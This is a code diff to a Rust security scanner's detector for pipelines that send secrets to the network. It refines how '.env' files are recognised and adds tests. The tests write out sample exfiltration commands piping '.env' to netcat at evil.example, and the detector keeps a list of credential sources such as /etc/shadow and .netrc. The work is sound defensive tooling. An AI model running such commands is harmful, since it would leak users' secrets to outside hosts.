@@ -16,6 +16,7 @@
 //! so `curl ... | jq '.hash'` does not look like a shell sink.
 
 use crate::detectors::native_ids::{PIPELINE_FETCH_TO_SHELL, PIPELINE_SECRET_TO_NETWORK};
+use crate::detectors::scripts::dotenv::references_dotenv_file;
 use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, SignalClass,
     ThreatCategory,
@@ -56,7 +57,6 @@ const SECRET_MARKERS: &[&str] = &[
     "/.netrc",
     "/etc/passwd",
     "/etc/shadow",
-    ".env",
     "printenv",
     "gpg --decrypt",
 ];
@@ -87,7 +87,11 @@ fn stage_is_network_source(stage: &str) -> bool {
 }
 
 fn stage_is_secret_source(stage: &str) -> bool {
-    contains_any(stage, SECRET_MARKERS)
+    // `.env` is routed through the boundary-aware `references_dotenv_file`
+    // (not a bare `.env` substring) so a `.envrc` / `.envelope` lookalike
+    // does not falsely register as a secret source — consistent with every
+    // other `.env` consumer in the codebase.
+    contains_any(stage, SECRET_MARKERS) || references_dotenv_file(stage)
 }
 
 fn stage_is_network_sink(stage: &str) -> bool {
@@ -266,5 +270,26 @@ mod tests {
     #[test]
     fn logical_or_is_not_a_data_pipe() {
         assert!(ids("curl http://example.com/x || bash fallback.sh\n").is_empty());
+    }
+
+    /// Contract: a genuine `.env` read piped to a network sink fires the
+    /// secret-to-network rule.
+    #[test]
+    fn dotenv_piped_to_network_fires() {
+        assert_eq!(
+            ids("cat .env | nc evil.example 80\n"),
+            vec![PIPELINE_SECRET_TO_NETWORK.to_string()]
+        );
+    }
+
+    /// Contract: a `.env` *lookalike* filename (`.envrc`, `.envelope`) is
+    /// NOT a secret source, so piping it to a network command does not
+    /// fire. Pre-fix the bare `.env` substring in `SECRET_MARKERS` made
+    /// `cat .envrc | nc ...` a false positive, inconsistent with every
+    /// other `.env` consumer.
+    #[test]
+    fn dotenv_lookalike_piped_to_network_does_not_fire() {
+        assert!(ids("cat .envrc | nc evil.example 80\n").is_empty());
+        assert!(ids("cat config.envelope | nc evil.example 80\n").is_empty());
     }
 }
